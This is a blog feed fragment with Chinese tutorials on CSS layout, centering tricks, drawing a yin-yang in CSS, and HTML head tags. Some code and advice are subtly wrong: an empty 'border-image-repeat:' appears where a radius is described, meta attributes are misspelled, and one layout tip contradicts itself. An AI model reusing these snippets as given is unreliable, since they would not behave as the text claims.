        <content type="html"><![CDATA[<h2 id="CSS布局"><a href="#CSS布局" class="headerlink" title="CSS布局"></a>CSS布局</h2><h2 id="float-布局"><a href="#float-布局" class="headerlink" title="float 布局"></a>float 布局</h2><p>float 布局应该是目前各大网站用的最多的一种布局方式了，但是也特别复杂，这里详细讲一下</p><p>首先，什么是浮动？</p><p>浮动元素是脱离文档流的，但不脱离文本流，这是什么意思呢，用过 word 的应该知道有一种图片环绕的方式是文字环绕吧，就是这种效果。</p><p>那么它有什么特点呢</p><ul><li>对自身的影响 <ul><li>float 元素可以形成块，如 span元素。可以让行内元素也拥有宽和高，因为块级元素具有宽高</li><li>浮动元素的位置尽量靠上</li><li>尽量靠左（float:left）或右（float:right），如果那一行满足不了浮动元素的宽度要求，则元素会往下掉</li></ul></li><li>对兄弟元素的影响 <ul><li>不影响其他块级元素的位置</li><li>影响其他块级元素的文本</li><li>上面贴非 float 元素</li><li>旁边贴 float 元素或者边框</li></ul></li><li>对父级元素的影响 <ul><li>从布局上 “消失”</li><li>高度塌陷</li></ul></li></ul><p>如果有以下html结构，设置<strong>左右两栏布</strong>局</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;parent&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;leftChild&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;div class=&quot;rightChild&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>设置浮动</strong>：左右布局常用的方法就是为子元素设置浮动，然后在其<strong>父元素上使用clearfix类</strong>清除浮动。示例代码如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.clearfix::after&#123;</span><br><span class="line">  content:&quot;&quot;;</span><br><span class="line">  display:block;</span><br><span class="line">  clear:both;</span><br><span class="line">&#125;</span><br><span class="line">.leftChild,</span><br><span class="line">.rightChild&#123;</span><br><span class="line">  float:left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>-<strong>设置position</strong>绝对定位，为父元素设置position:relative; 为子元素设置position:absolute 。示例代码如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.parent&#123;</span><br><span class="line">  position:relative;</span><br><span class="line">&#125;</span><br><span class="line">.leftChild&#123;</span><br><span class="line">  position:absolute;</span><br><span class="line">  left:0;</span><br><span class="line">  top:0;</span><br><span class="line">&#125;</span><br><span class="line">.rightChild&#123;</span><br><span class="line">  position:absolute;</span><br><span class="line">  left:200px;</span><br><span class="line">  top:0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong>三栏布局</strong></p><p>左中右布局主要方法也是浮动或者绝对定位，不过可以分情况选择其一使用甚至结合使用。</p><p>三栏布局，思路主要是左边一个浮动元素，右边一个浮动元素。这里有个小问题，中间的元素要写在最后，因为中间元素假设有块级元素的话，会影响右边浮动元素的定位，这里演示一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;CSS 布局&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">*&#123;</span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line">&#125;</span><br><span class="line">.container&#123;</span><br><span class="line">    width: 400px;</span><br><span class="line">    height: 200px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.left&#123;</span><br><span class="line">    background-color: yellow; </span><br><span class="line">    float: left;</span><br><span class="line">    height: 100%;</span><br><span class="line">    width:100px;</span><br><span class="line">&#125;</span><br><span class="line">.right&#123;</span><br><span class="line">    background-color: green; </span><br><span class="line">    float: right;</span><br><span class="line">    height: 100%;</span><br><span class="line">    width:100px;</span><br><span class="line">&#125;</span><br><span class="line">.middle&#123;</span><br><span class="line">    background-color: red; </span><br><span class="line">    margin-left: 100px;</span><br><span class="line">    margin-right: 100px;</span><br><span class="line">    height:100%;</span><br><span class="line">&#125;</span><br><span class="line">.container::after&#123;</span><br><span class="line">    content: &#x27;&#x27;;</span><br><span class="line">    display: block;</span><br><span class="line">    visibility: hidden;</span><br><span class="line">    clear: both</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=container&gt;       </span><br><span class="line">        &lt;div class=left&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;middle&quot;&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div class=right&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>因为浮动元素会把块级元素的位置空出来，所以这里右边的浮动元素把上面的位置空了下来，所以正确的写法应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=container&gt;       </span><br><span class="line">        &lt;div class=left&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div class=right&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;middle&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><strong>特定情况下使用浮动还是绝对定位</strong></p><ul><li>使用浮动时：不需要计算特别精确的位置，不过不易操控，浮动元素的宽度需要注意，否则会换行展示，适用于导航栏等地方。</li><li>使用绝对定位：需要计算元素的具体位置，不过更加准确，易于操控。</li><li>当某些元素的位置要根据父元素的大小自适应，内容宽度无法确定时，建议使用浮动</li><li>当特定元素的位置是相对父元素固定，或者内容宽高确定，需要精确定位甚至以后要用js操作变换位置时，建议使用浮动</li></ul><h2 id="关于居中"><a href="#关于居中" class="headerlink" title="关于居中"></a>关于居中</h2><p><strong>水平居中</strong></p><ul><li>文字的水平居中</li></ul><p>将一段文字置于容器的水平中点，只要设置text-align属性即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　text-align:center;</span><br></pre></td></tr></table></figure><ul><li>容器的水平居中</li></ul><p>先为该容器设置一个明确宽度，然后将margin的水平值设为auto即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">　　div#container &#123;</span><br><span class="line">　　　　width:760px;</span><br><span class="line">　　　　margin:0 auto;</span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure><p><strong>垂直居中</strong></p><ul><li>文字的垂直居中</li></ul><p>单行文字的垂直居中，只要将行高与容器高设为相等即可。</p><p>比如，容器中有一行数字。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　　&lt;div id=&quot;container&quot;&gt;1234567890&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>然后CSS这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div#container &#123;height: 35px; line-height: 35px;&#125;</span><br></pre></td></tr></table></figure><ul><li>容器的垂直居中</li></ul><p>比如，有一大一小两个容器，请问如何将小容器垂直居中？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">　　&lt;div id=&quot;big&quot;&gt;</span><br><span class="line">　　　　&lt;div id=&quot;small&quot;&gt;</span><br><span class="line">　　　　&lt;/div&gt;</span><br><span class="line">　　&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>首先，将大容器的定位为relative。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">　　div#big&#123;</span><br><span class="line">　　　　position:relative;</span><br><span class="line">　　　　height:480px;</span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure><p>然后，将小容器定位为absolute，再将它的左上角沿y轴下移50%，最后将它margin-top上移本身高度的50%即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">　　div#small &#123;</span><br><span class="line">　　　　position: absolute;</span><br><span class="line">　　　　top: 50%;</span><br><span class="line">　　　　height: 240px;</span><br><span class="line">　　　　margin-top: -120px;</span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure><p>使用同样的思路，也可以做出水平居中的效果。</p><h3 id="关于CSS布局的小技巧"><a href="#关于CSS布局的小技巧" class="headerlink" title="关于CSS布局的小技巧"></a>关于CSS布局的小技巧</h3><p><strong>图片宽度的自适应</strong></p><p>如何使得较大的图片，能够自动适应小容器的宽度？CSS可以这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img &#123;max-width: 100%&#125;</span><br></pre></td></tr></table></figure><p><strong>CSS的优先性</strong></p><p>如果同一个容器被多条CSS语句定义，那么哪一个定义优先呢？</p><p>基本规则是：</p><p><strong>行内样式 &gt; id样式 &gt; class样式 &gt; 标签名样式</strong></p><p>比如，有一个元素：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;ID&quot; class=&quot;CLASS&quot; style=&quot;color:black;&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>行内样式是最优先的，然后其他设置的优先性，从低到高依次为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div &lt; .class &lt; div.class &lt; #id &lt; div#id &lt; #id.class &lt; div#id.class</span><br></pre></td></tr></table></figure><p><strong>用图片充当列表标志</strong></p><p>默认情况下，浏览器使用一个黑圆圈作为列表标志，可以用图片取代它：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">　　ul &#123;list-style: none&#125;</span><br><span class="line"></span><br><span class="line">　　ul li &#123; </span><br><span class="line">　　　　background-image: url(&quot;path-to-your-image&quot;); </span><br><span class="line">　　　　background-repeat: none; </span><br><span class="line">　　　　background-position: 0 0.5em; </span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure><p><strong>透明</strong></p><p>将一个容器设为透明，可以使用下面的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">　　.element &#123; </span><br><span class="line">　　　　filter:alpha(opacity=50); </span><br><span class="line">　　　　-moz-opacity:0.5; </span><br><span class="line">　　　　-khtml-opacity: 0.5; </span><br><span class="line">　　　　opacity: 0.5; </span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure><p><strong>CSS三角形</strong></p><p>如何使用CSS生成一个三角形？</p><p>先编写一个空元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;triangle&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>然后，将它四个边框中的三个边框设为透明，剩下一个设为可见，就可以生成三角形效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">　　.triangle &#123; </span><br><span class="line">　　　　border-color: transparent transparent green transparent; </span><br><span class="line">　　　　border-style: solid; </span><br><span class="line">　　　　border-width: 0px 300px 300px 300px; </span><br><span class="line">　　　　height: 0px; </span><br><span class="line">　　　　width: 0px; </span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure><p>其他图形可以用同样的道理画出。</p><p><strong>CSS提示框</strong><br>当鼠标移动到链接上方，会自动出现一个提示框。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a class=&quot;tooltip&quot; href=&quot;#&quot;&gt;链接文字 &lt;span&gt;提示文字&lt;/span&gt;</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>CSS这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">　　a.tooltip &#123;position: relative&#125; </span><br><span class="line">　　a.tooltip span &#123;display:none; padding:5px; width:200px;&#125; </span><br><span class="line">　　a:hover &#123;background:#fff;&#125; /*background-color is a must for IE6*/ </span><br><span class="line">　　a.tooltip:hover span&#123;display:inline; position:absolute;&#125;</span><br></pre></td></tr></table></figure><p><strong>固定位置的页首</strong></p><p>当页面滚动时，有时需要页首在位置固定不变，CSS语句可以这样写，效果参见<a href="http://limpid.nl/lab/css/fixed/header%EF%BC%9A">http://limpid.nl/lab/css/fixed/header：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">　　body&#123; margin:0;padding:100px 0 0 0;&#125;</span><br><span class="line"></span><br><span class="line">　　div#header&#123;</span><br><span class="line">　　　　position:absolute;</span><br><span class="line">　　　　top:0;</span><br><span class="line">　　　　left:0;</span><br><span class="line">　　　　width:100%;</span><br><span class="line">　　　　height:&lt;length&gt;;</span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line">　　@media screen&#123;</span><br><span class="line">　　　　body&gt;div#header&#123;position: fixed;&#125;</span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line">　　* html body&#123;overflow:hidden;&#125;</span><br><span class="line"></span><br><span class="line">　　* html div#content&#123;height:100%;overflow:auto;&#125;</span><br></pre></td></tr></table></figure><p><strong>容器的水平和垂直居中</strong></p><p>HTML代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;figure class=&#x27;logo&#x27;&gt;</span><br><span class="line"></span><br><span class="line">　&lt;span&gt;&lt;/span&gt;</span><br><span class="line"></span><br><span class="line">　&lt;img class=&#x27;photo&#x27;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/figure&gt;</span><br></pre></td></tr></table></figure><p>CSS代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.logo &#123;</span><br><span class="line">　　　　display: block;</span><br><span class="line">　　　　text-align: center;</span><br><span class="line">　　　　display: block;</span><br><span class="line">　　　　text-align: center;</span><br><span class="line">　　　　vertical-align: middle;</span><br><span class="line">　　　　border: 4px solid #dddddd;</span><br><span class="line">　　　　padding: 4px;</span><br><span class="line">　　　　height: 74px;</span><br><span class="line">　　　　width: 74px; &#125;</span><br><span class="line"></span><br><span class="line">　　.logo * &#123;</span><br><span class="line">　　　　display: inline-block;</span><br><span class="line">　　　　height: 100%;</span><br><span class="line">　　　　vertical-align: middle; &#125;</span><br><span class="line"></span><br><span class="line">　　.logo .photo &#123;</span><br><span class="line">　　　　height: auto;</span><br><span class="line">　　　　width: auto;</span><br><span class="line">　　　　max-width: 100%;</span><br><span class="line">　　　　max-height: 100%; &#125;</span><br></pre></td></tr></table></figure><hr><p><strong>本博客相关内容出处来自阮一峰的博客</strong></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何用CSS画一个太极</title>
      <link href="/posts/b357f4ce/"/>
      <url>/posts/b357f4ce/</url>
      
        <content type="html"><![CDATA[<p>本文将介绍如何用CSS画一个太极图</p><p><img src="https://css-tricks.com/wp-content/uploads/2017/06/sym_yin_yang_static.svg" alt="image"></p><p>首先 画一个方块黑白各一半</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  background-color: lightslategray;</span><br><span class="line">&#125;</span><br><span class="line">.yy &#123;</span><br><span class="line">  width: 0px;</span><br><span class="line">  height: 600px;</span><br><span class="line">  border-left: 300px solid black;</span><br><span class="line">  border-right: 300px solid white;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如图<br><img src="https://github.com/808Mak1r/yinyang-demo/blob/master/img/1.jpg?raw=true" alt="image"></p><p>再画白色部分的园（先画方块）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.yy::before &#123;</span><br><span class="line">  content: &#x27;&#x27;;</span><br><span class="line">  display: block;</span><br><span class="line">  width: 100px;</span><br><span class="line">  height: 100px;</span><br><span class="line">  border: 100px solid black ;</span><br><span class="line">  border-image-repeat: </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如图<br><img src="https://github.com/808Mak1r/yinyang-demo/blob/master/img/2.jpg?raw=true" alt="image"></p><p>再设置它的半径为100%</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">border-image-repeat: </span><br></pre></td></tr></table></figure><p>图3<br><img src="https://github.com/808Mak1r/yinyang-demo/blob/master/img/3.jpg?raw=true" alt="image"></p><p>再让圆居中对齐</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">background-color: white;</span><br><span class="line">margin-left: -150px;</span><br></pre></td></tr></table></figure><p>图4</p><p><img src="https://github.com/808Mak1r/yinyang-demo/blob/master/img/4%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.jpg?raw=true" alt="image"></p><p>接下来在白色下面画一个宽高100px的方块，在上面加一个100px白色的外框，和上面一样让它的半径100%再加上黑色的背景色，一个小黑球就完成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.yy::after &#123;</span><br><span class="line">  content: &#x27;&#x27;;</span><br><span class="line">  display: block;</span><br><span class="line">  width: 100px;</span><br><span class="line">  height: 100px;</span><br><span class="line">  border: 100px solid white;</span><br><span class="line">  border-radius: 100%;</span><br><span class="line">  background-color: black;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>图5</p><p><img src="https://github.com/808Mak1r/yinyang-demo/blob/master/img/5%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.jpg?raw=true" alt="image"></p><p>然后同理让整个图的半径100%就变成圆了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  background-color: lightslategray;</span><br><span class="line">&#125;</span><br><span class="line">.yy &#123;</span><br><span class="line">  width: 0px;</span><br><span class="line">  height: 600px;</span><br><span class="line">  border-left: 300px solid black;</span><br><span class="line">  border-right: 300px solid white;</span><br><span class="line">  border-radius: 100%;</span><br><span class="line">  margin-top: 60px;</span><br><span class="line">  margin-left: auto;</span><br><span class="line">  margin-right: auto;</span><br><span class="line">  margin-bottom: auto;</span><br><span class="line">&#125;</span><br><span class="line">.yy::before &#123;</span><br><span class="line">  content: &#x27;&#x27;;</span><br><span class="line">  display: block;</span><br><span class="line">  width: 100px;</span><br><span class="line">  height: 100px;</span><br><span class="line">  border: 100px solid black ;</span><br><span class="line">  border-radius: 100%;</span><br><span class="line">  background-color: white;</span><br><span class="line">  margin-left: -150px;</span><br><span class="line">&#125;</span><br><span class="line">.yy::after &#123;</span><br><span class="line">  content: &#x27;&#x27;;</span><br><span class="line">  display: block;</span><br><span class="line">  width: 100px;</span><br><span class="line">  height: 100px;</span><br><span class="line">  border: 100px solid white;</span><br><span class="line">  border-radius: 100%;</span><br><span class="line">  background-color: black;</span><br><span class="line">  margin-left: -150px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML常用标签</title>
      <link href="/posts/16a89419/"/>
      <url>/posts/16a89419/</url>
      
        <content type="html"><![CDATA[<h1 id="1-HTML5头部结构"><a href="#1-HTML5头部结构" class="headerlink" title="1.HTML5头部结构"></a>1.HTML5头部结构</h1><p>【DOCTYPE html】<br>声明文档类型为HTML5文件。<br>文档声明在HTML5文档必不可少，且必须放在文档的第一行。</p><p>【meta标签】<br>1-charset属性：单独使用，设置文档字符及编码格式。<br>写法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>常见的中文编码格式：<br>B-2312:国标码，简体中文<br>GBK：扩展的国标编码，简体中文<br>UTF-8:万国码 Unicode码，基本兼容各国语言<br>2-http-equiv属性：需配合content属性使用。主要声明浏览器如何解释编译文件。<br>写法：&#96;&#96;&#96;html</p><meta http-equiv="属性值" content="属性值详细内容"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">常用属性值：Content-Type HTML4.01之前的文档内容编码声明。</span><br><span class="line">refresh 网页刷新</span><br><span class="line">set-Cookie 设置浏览器cookie缓存</span><br><span class="line">3-name属性：需配合content属性使用，主要用于给搜索引擎提供必要信息。</span><br><span class="line">写法：```html</span><br><span class="line">&lt;meta name=&quot;属性值&quot; content=&quot;属性值详细内容&quot;&gt;</span><br></pre></td></tr></table></figure>重要属性值：author 作者，声明网站作者，常用公司网址表示keywords 网站关键字，多个关键字，用英文逗号分隔description 网页描述，搜索引擎显示在title下的描述内容☆☆http-equiv和name属性，必须与content属性配合使用，前两者只是用于声明即将修改哪些属性值，而实际的属性值内容，在content中描述。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--charset属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--作者--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;anthor&quot;</span> <span class="attr">contet</span>=<span class="string">&quot;http://www.yt4561761.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--网页关键字--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;HTML5,网页，第一个&quot;</span></span></span><br><span class="line"><span class="tag">&lt;!<span class="attr">--网页描述--</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">我的第一个网页</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--声明文档的编码格式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>  <p>【link标签】<br>1-作用：用于为网页链接各种文件。<br>2-常用属性：<br>rel：用于表明被链接文件与当前文件关系。icon表明被链接图片是当前网页的icon图标。<br>type：表明被链接文件是什么类型，可省略。<br>href：表明链接文件的地址。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;img/icon.png&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>【title标签】<br>网页的标题，即网页选项卡上的文字。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>111<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.常见的块级标签</p><p>【常见的块级标签】</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 